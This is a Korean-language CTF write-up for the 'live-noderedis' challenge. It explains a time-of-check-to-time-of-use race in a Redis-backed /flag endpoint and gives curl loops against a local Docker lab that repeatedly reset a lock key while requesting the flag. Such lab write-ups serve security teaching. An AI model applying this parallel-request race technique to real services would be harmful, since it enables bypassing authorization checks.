# Race Condition Exploit for live-noderedis CTF

## 취약점 분석

### 발견된 취약점: Race Condition
`/flag` 엔드포인트에서 다음과 같은 로직 흐름이 존재합니다:

1. `username_locked`를 `true`로 설정
2. `username_apple` 값 검증 (`"apple"`이어야 함)
3. `username_banana` 값 검증 (base64 디코딩 후 `"banana"`이어야 함)
4. `username_locked` 값 다시 확인 (`true`이면 차단)

**문제점**: 1단계에서 4단계 사이에 다른 요청이 `username_locked` 값을 변경할 수 있습니다.

## 공격 시나리오

1. **사전 준비**: 필요한 Redis 키 설정
   - `{username}_apple = "apple"`
   - `{username}_banana = base64("banana") = "YmFuYW5h"`

2. **Race Condition 익스플로잇**:
   - `/flag?username={username}` 요청과 동시에
   - `/set?key={username}_locked&value=false` 요청을 여러 번 병렬로 실행

3. **타이밍**: locked 설정 후 마지막 검증 전에 false로 변경

## 사용법

### Python Solver (권장)
```bash
python solver.py
```

### 비동기 Python Solver  
```bash
# aiohttp 설치 필요
pip install aiohttp
python async_solver.py
```

### Bash Solver
```bash
chmod +x solver.sh
./solver.sh
```

## 수동 테스트

1. 서버 실행:
```bash
docker-compose up
```

2. 값 설정:
```bash
curl "http://localhost:23001/set?key=test_apple&value=apple"
curl "http://localhost:23001/set?key=test_banana&value=YmFuYW5h"
```

3. Race condition 공격:
```bash
# 터미널 1: unlock 요청 반복
while true; do curl "http://localhost:23001/set?key=test_locked&value=false"; done

# 터미널 2: 플래그 요청 반복  
while true; do curl "http://localhost:23001/flag?username=test"; done
```

## 성공 조건

- 응답에 `poka{...}` 형태의 플래그가 포함되면 성공
- 실패 시 `locked`, `not apple`, `not banana` 등의 메시지 출력

## 팁

- 여러 개의 unlock 요청을 병렬로 실행하여 성공 확률 높이기
- 네트워크 지연이 있는 환경에서 더 효과적
- 필요시 시도 횟수나 스레드 수 조정